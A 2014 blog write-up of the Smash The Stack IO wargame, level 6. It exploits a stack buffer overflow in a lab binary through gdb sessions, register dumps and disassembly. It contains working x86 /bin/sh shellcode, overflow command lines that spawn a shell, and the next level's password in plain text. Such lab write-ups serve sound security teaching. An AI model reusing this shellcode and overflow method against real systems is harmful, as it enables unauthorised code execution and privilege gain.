---
title: "SMASH THE STACK LEVEL6"
date: 2014-12-05T00:28:10+00:00
url: "/smash-stack-level6/"
draft: false
description: "Smash The Stack Level 6 this app take 2 argument 1 username 2 password it takes it then say hi also, it checks ur env language and change the msg let's make..."
categories: ["blog", "exploit-dev", "Security", "tech"]
---

Smash The Stack  Level 6

```bash
level6@io:/levels$ ./level06 a b
Hi a
```

this app take 2 argument

1 - username

2- password

it takes it then say hi

also, it checks ur env language

and change the msg

```bash
level6@io:/levels$ export LANG=fr
level6@io:/levels$ ./level06 a b
Bienvenue a

level6@io:/levels$ export LANG=de
level6@io:/levels$ ./level06 a b
Willkommen a
level6@io:/levels$
```

let's make some love with gdb

btw without change ur language, it will not overwrite the EIP

```bash
level6@io:/levels$ gdb level06
(gdb) r $(python -c "print 'A' *100 + ' '+  'B'* 200")
Starting program: /levels/level06 $(python -c "print 'A' *100 + ' '+  'B'* 200")
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers
eax            0x54	84
ecx            0xb7fcf4e0	-1208159008
edx            0xb7fd0360	-1208155296
ebx            0xbffffb00	-1073743104
esp            0xbffffab0	0xbffffab0
ebp            0x42424242	0x42424242
esi            0xbffffb4c	-1073743028
edi            0xbffffafc	-1073743108
eip            0x42424242	0x42424242
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

now we overwrite the EIP

this is awesome

```x86asm
 0x08048593 <+0>:	push   %ebp
   0x08048594 <+1>:	mov    %esp,%ebp
   0x08048596 <+3>:	push   %edi
   0x08048597 <+4>:	push   %esi
   0x08048598 <+5>:	push   %ebx
   0x08048599 <+6>:	and    $0xfffffff0,%esp
   0x0804859c <+9>:	sub    $0xa0,%esp
   0x080485a2 <+15>:	cmpl   $0x3,0x8(%ebp)
   0x080485a6 <+19>:	je     0x80485c7 <main+52>
   0x080485a8 <+21>:	mov    0xc(%ebp),%eax
   0x080485ab <+24>:	mov    (%eax),%eax
   0x080485ad <+26>:	mov    %eax,0x4(%esp)
   0x080485b1 <+30>:	movl   $0x8048750,(%esp)
   0x080485b8 <+37>:	call   0x80483b0 <printf@plt>
   0x080485bd <+42>:	mov    $0x1,%eax
   0x080485c2 <+47>:	jmp    0x80486af <main+284>
   0x080485c7 <+52>:	lea    0x50(%esp),%ebx
   0x080485cb <+56>:	mov    $0x0,%eax
   0x080485d0 <+61>:	mov    $0x13,%edx
   0x080485d5 <+66>:	mov    %ebx,%edi
   0x080485d7 <+68>:	mov    %edx,%ecx
   0x080485d9 <+70>:	rep stos %eax,%es:(%edi)
   0x080485db <+72>:	mov    0xc(%ebp),%eax
   0x080485de <+75>:	add    $0x4,%eax
   0x080485e1 <+78>:	mov    (%eax),%eax
   0x080485e3 <+80>:	movl   $0x28,0x8(%esp)
   0x080485eb <+88>:	mov    %eax,0x4(%esp)
   0x080485ef <+92>:	lea    0x50(%esp),%eax
   0x080485f3 <+96>:	mov    %eax,(%esp)
   0x080485f6 <+99>:	call   0x8048420 <strncpy@plt>
   0x080485fb <+104>:	mov    0xc(%ebp),%eax
   0x080485fe <+107>:	add    $0x8,%eax
   0x08048601 <+110>:	mov    (%eax),%eax
   0x08048603 <+112>:	movl   $0x20,0x8(%esp)
---Type <return> to continue, or q <return> to quit---
   0x0804860b <+120>:	mov    %eax,0x4(%esp)
   0x0804860f <+124>:	lea    0x50(%esp),%eax
   0x08048613 <+128>:	add    $0x28,%eax
   0x08048616 <+131>:	mov    %eax,(%esp)
   0x08048619 <+134>:	call   0x8048420 <strncpy@plt>
   0x0804861e <+139>:	movl   $0x804876d,(%esp)
   0x08048625 <+146>:	call   0x80483e0 <getenv@plt>
   0x0804862a <+151>:	mov    %eax,0x9c(%esp)
   0x08048631 <+158>:	cmpl   $0x0,0x9c(%esp)
   0x08048639 <+166>:	je     0x8048697 <main+260>
   0x0804863b <+168>:	movl   $0x2,0x8(%esp)
   0x08048643 <+176>:	movl   $0x8048772,0x4(%esp)
   0x0804864b <+184>:	mov    0x9c(%esp),%eax
   0x08048652 <+191>:	mov    %eax,(%esp)
   0x08048655 <+194>:	call   0x80483c0 <memcmp@plt>
   0x0804865a <+199>:	test   %eax,%eax
   0x0804865c <+201>:	jne    0x804866a <main+215>
   0x0804865e <+203>:	movl   $0x1,0x8049964
   0x08048668 <+213>:	jmp    0x8048697 <main+260>
   0x0804866a <+215>:	movl   $0x2,0x8(%esp)
   0x08048672 <+223>:	movl   $0x8048775,0x4(%esp)
   0x0804867a <+231>:	mov    0x9c(%esp),%eax
   0x08048681 <+238>:	mov    %eax,(%esp)
   0x08048684 <+241>:	call   0x80483c0 <memcmp@plt>
   0x08048689 <+246>:	test   %eax,%eax
   0x0804868b <+248>:	jne    0x8048697 <main+260>
   0x0804868d <+250>:	movl   $0x2,0x8049964
   0x08048697 <+260>:	mov    %esp,%edx
   0x08048699 <+262>:	lea    0x50(%esp),%ebx
   0x0804869d <+266>:	mov    $0x13,%eax
   0x080486a2 <+271>:	mov    %edx,%edi
   0x080486a4 <+273>:	mov    %ebx,%esi
   0x080486a6 <+275>:	mov    %eax,%ecx
   0x080486a8 <+277>:	rep movsl %ds:(%esi),%es:(%edi)
   0x080486aa <+279>:	call   0x804851c <greetuser>
---Type <return> to continue, or q <return> to quit---
   0x080486af <+284>:	lea    -0xc(%ebp),%esp
   0x080486b2 <+287>:	pop    %ebx
   0x080486b3 <+288>:	pop    %esi
   0x080486b4 <+289>:	pop    %edi
   0x080486b5 <+290>:	pop    %ebp> to continue, or q <return> to quit---q
Quit
   0x08048625 <+146>:	call   0x80483e0 <getenv@plt>
```

 

so first  hit my mind what if i put the shell code in env LANG

as we see in the disassemble

```
0x08048625 <+146>: call 0x80483e0 <getenv@plt>
```

 

i did try to export my shell in LANG  but the shell didn't work

so lets do it our way

the most important in the source

```
struct UserRecord{
	char name[40];
	char password[32];
	int id;
};
```

so i will push the shell code in the username

then call it from the password :D

simple huh

```x86asm
Starting program: /levels/level06 $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 28 + '\x11\xfe\xff\xbf'")
Willkommen                  1 Ph//shh/bin  PS  
                                                ̀BBBBBBBBBBBBBBBBBBBBBBBBBBBB   

Program received signal SIGSEGV, Segmentation fault.
0x11424242 in ?? ()
(gdb) info registers
eax            0x54	84
ecx            0xb7fcf4e0	-1208159008
edx            0xb7fd0360	-1208155296
ebx            0xbffffbe0	-1073742880
esp            0xbffffb90	0xbffffb90
ebp            0x42424242	0x42424242
esi            0xbffffc2c	-1073742804
edi            0xbffffbdc	-1073742884
eip            0x11424242	0x11424242
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/200s $esp
0xbffffb90:	 "\376\377\277"
0xbffffb94:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀", 'B' <repeats 28 times>, "\021\376\377\277"
0xbffffbd9:	 ""
0xbffffbda:	 ""
0xbffffbdb:	 ""
0xbffffbdc:	 "\001"
0xbffffbe0:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀", 'B' <repeats 28 times>, "\021\376\377\277"

(gdb) x/1s 0xbffffbe0
(gdb) x/1s 0xbffffbe0
0xbffffbe0:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀", 'B' <repeats 28 times>, "\021\376\377\277"
```

so we have the right address for shellcode

 

```x86asm
(gdb) r $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 26 + '\xe0\xfb\xff\xbf'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level06 $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 26 + '\xe0\xfb\xff\xbf'")
Willkommen                  1 Ph//shh/bin  PS  
                                                ̀BBBBBBBBBBBBBBBBBBBBBBBBBB    

Program received signal SIGSEGV, Segmentation fault.
0xfffbe042 in ?? ()
(gdb) r $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 25 + '\xe0\xfb\xff\xbf'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level06 $(python -c "print '\x90' *17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + ' '+  'B'* 25 + '\xe0\xfb\xff\xbf'")
Willkommen                  1 Ph//shh/bin  PS  
                                                ̀BBBBBBBBBBBBBBBBBBBBBBBBB    
process 2780 is executing new program: /bin/bash
sh-4.2$
```

 

after doing it from bash direct it gives segmentation fault address's errors

so i decided to make it another way

```bash
level6@io:/levels$ export n1x=$(python -c "print '\x90' * 32 +'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
```

 

```bash
level6@io:/levels$ gdb ./level06
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /levels/level06...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048599
(gdb) r 1 b
Starting program: /levels/level06 1 b

Breakpoint 1, 0x08048599 in main ()
(gdb) x/600s $esp
0xbfffffb0:	 "n1x=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211
```

 

 

```bash
(gdb) r $(python -c "print 'A' * 40 + ' ' + 'B' * 26 + '\xb4\xff\xff\xbf'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level06 $(python -c "print 'A' * 40 + ' ' + 'B' * 26 + '\xb4\xff\xff\xbf'")

Breakpoint 1, 0x08048599 in main ()
(gdb) c
Continuing.
Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB    
process 3615 is executing new program: /bin/bash

Breakpoint 1, 0x08062dc6 in main ()
(gdb) c
Continuing.
sh-4.2$ cat /home/level7/.pass
cat: /home/level7/.pass: Permission denied
sh-4.2$ exit
[Inferior 1 (process 3615) exited with code 01]
(gdb) quit
level6@io:/levels$ ./level06 $(python -c "print 'A' * 40 + ' ' + 'B' * 26 + '\xb4\xff\xff\xbf'")
Bienvenue AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBB    
sh-4.2$ cat /home/level7/.pass
Nsr869Iyc0sFCX7I
sh-4.2$
```

done
